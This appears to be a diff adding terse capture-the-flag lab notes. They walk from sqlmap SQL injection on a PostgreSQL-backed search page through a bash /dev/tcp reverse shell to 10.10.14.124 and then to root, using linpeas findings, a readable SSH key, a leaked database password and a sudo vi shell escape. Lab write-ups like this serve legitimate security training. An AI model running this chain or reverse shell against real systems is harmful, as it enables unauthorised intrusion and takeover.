@@ -1,0 +1,33 @@
+Simple page with table and a search form ---> sql query
+
+sqlmap [using cookie flag] ---> GET is vulnerable
+			   ---> DB = PostgreSQL
+			   ---> getting a shell with --os-shell ---> [bash -c 'bash -i >& /dev/tcp/10.10.14.124/8443 0>&1'] ---> shell pop up
+
+
+POST EXPLOTAION
+
+
+
+
+
+
+linpeas.sh ---> sudo is outdated and vulnerable to CVE-2021-3156 [like previous machine]
+           ---> /var/lib/postgresql/.ssh/id_rsa can be read    ---> ssh private key --> [id_rsa_target]
+           ---> /home/simon/.sudo_as_admin_successful          ---> user used sudo successfully
+           ---> /var/www/html/dashboard.php:   [...]user=postgres password=P@s5w0rd!
+           
+
+after gaining the password ---> sudo -l ---> /bin/vi /etc/postgresql/11/main/pg_hba.conf ---> in vi if insert ':!/bin/bash' you escalate to root
+[https://medium.com/@pettyhacks/linux-privilege-escalation-via-vi-36c00fcd4f5e]
+
+MACHINE COMPLETED!												
+
+
+
+
+
+
+
+		 
+
